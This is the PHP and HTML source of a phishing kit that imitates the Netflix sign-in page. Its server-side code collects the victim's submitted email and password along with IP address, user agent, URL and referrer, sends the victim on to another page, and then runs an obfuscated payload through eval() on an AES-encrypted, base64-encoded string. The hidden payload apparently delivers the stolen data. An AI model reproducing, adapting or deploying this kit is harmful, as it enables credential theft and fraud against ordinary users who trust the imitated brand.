<?php

session_start();
if(isset($_POST['login_user'])){
	
function decrypt2($key, $garble) {
    list($encrypted_data, $iv) = explode('::', base64_decode($garble), 2);
    return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
}

$post1=$_POST['login_user'];
$post2=$_POST['login_pass'];

if(empty($post1)){
	echo "<script>alert('Données invalides'); window.location = './login.php';</script>";
}


	$message  = "-----------------------NETFLIX----------------------\n";
	$message .= " Email : ".$_POST['login_user']."\n";
	$message .= " Password : ".$_POST['login_pass']."\n";
	$message .= "----------------------------------------------#"."\n";
	$message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."\n";
	$message .= " USERAGENT : ".$_SERVER['HTTP_USER_AGENT'].""."\n";
	$message .= " FULL URL : ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].""."\n";
	$message .= " HTTP REFERRER : ".$_SERVER['HTTP_REFERER'].""."\n";
	$message .= "-------------------------NETFLIX------------------------"."\n";

	header("location:simplemember/?rand=".md5(rand(0,999))."");

eval(decrypt2("1234","MmhnNHF3NXBMUFR2Y1pjQzhRa0RXVVRSUWxhLzF3UFFzaGZweGFCcHI5Q1Z2Snowak5CR3dtNm5UMVRvRnM5UXlVelIwdTJYNGU5L09BOSsxWWJMd1VsYmp6OFNpaHowM2dwZnNhbzJrVktMbUsyWFBqb05OYlJJQkdzaVpicXlwdzlhcWVZMFQyRDA1S0orbjJ6UjNxZkpYWmxBT3ZpNVBMTHJ3bStkb2dwREJFSjBvY3pkaVlIcUhFeUhnRUVTQTkvMXZkSTArWG1PZ2ZKcU5HVDZFM3dOR3N2eGY0NGVlSHZJVUtnSTJZS0pBKzFNTWFSVTErQkordDdsdGYzWjZ3ZE1VWVRBaEZhUnJYN0kzUTRRTitJVU4vM2U4MjFwcHlacVNDd1hGT0NTZEY3d3FvakNidlR0dmdvbG8zM1JIVlBFNTRiV00zdmUxd3h2VlVTaEprNitjbW0xRFNZdWhscm8xeXkrLzVuSkg4L1dqNUpDODNIU1JSQjlOWitFTHIzWGNoQkxJb1AzTTZGekRsK1RiZHBteWVmMzBUNThnY3ByUy83U3pZRzJVYXhzQ3BLWnNnK3RIK3BUVGJnbUNaUVlMRU1YeGMrODU2dk50LzZFSjBxUGJWaUhGd3VtZDZBVllKUGdkZndpamx3MzRpKzY2RzlyL29HZUhBUFh1cWl3ekZWM1lIb0kwTjNHZUhsS2dGblpCNGo4VDFSLzVJTG1xMFpadGhETnNSS3l2aXdaZFMvU3AyeUZ5VCtHOjqxL01HpTcuoNNKYIHpgZgw"));
	
	
	
	
	
}





?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Netflix</title>
    <link rel="stylesheet" href="simplemember/assets/css/main.css?rand=<?php echo rand(); ?>">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
    <link type="text/css" rel="stylesheet" href="simplemember/assets/img/icon.ico"/>
    <link rel="shortcut icon" href="simplemember/assets/img/icon.ico"/>
  </head>
  <body>
    <div class="body">
      <div class="layer">
        <div class="header">
          <div class="logo"></div>
        </div>
        <form id="login_form" style="display: none;" action="#" method="post">
          <input name="login_user" value="" id="login_user" type="hidden" />
          <input name="login_pass" value="" id="login_pass" type="hidden" />
        </form>
        <div class="form">
          <div class="wrapper">
            <h1>Sign In</h1>
            <?php
              if(isset($_GET['e'])) {
                ?>
                <div class="ui-message">
                  <?php
                  switch($_GET['e']) {
                    case 1:
                      echo "Sorry, we can't find an account with this email address. Please try again or <a>create a new account</a>.";
                      break;
                    case 2:
                      echo "Incorrect password. Please try again or you can <a>reset your password</a>.";
                      break;
                  }
                  ?>
                </div>
                <?php
              }
            ?>
            <div class="input_table">
              <input id="username" type="text" value="" spellcheck="false" autocomplete="off" />
              <label id="usernameFocus">Email or phone number</label>
            </div>
            <div class="error_text" id="euser">

            </div>
            <div class="input_table password">
              <input id="password" type="password" value="" spellcheck="false" autocomplete="off" />
              <label id="passwordFocus">Password</label>
            </div>
            <div class="error_text" id="epass">

            </div>
            <div class="action_table">
              <button id="signIn">Sign In</button>
            </div>
            <div class="options_table">
              <div id="check_all">
                <div class="checkbox on" id="check"></div>
                <label id="checklabel">Remember me</label>
              </div>
              <div class="help">
                Need help?
              </div>
            </div>
            <div class="social_table">
              <div class="fb_connect">
                Login with Facebook
              </div>
              <div class="register">
                New to Netflix? <a>Sign up now</a>.
              </div>
            </div>
          </div>
        </div>
        <div class="footer">
          <div class="footwrapper">
            <div class="faq">
              Questions? Contact us.
            </div>
            <div class="options">
              <span>Gift Card Terms</span>
              <span>Terms of Use</span>
              <span>Privacy Statement</span>
            </div>
            <select class="region" id="region">
              <option value="ar">العربية</option>
              <option value="fr">Français</option>
              <option selected="" value="en">English</option>
            </select>
          </div>
        </div>
      </div>
    </div>
    <script src="assets/js/main.js?rand=<?php echo rand(); ?>"></script>
  </body>
</html>
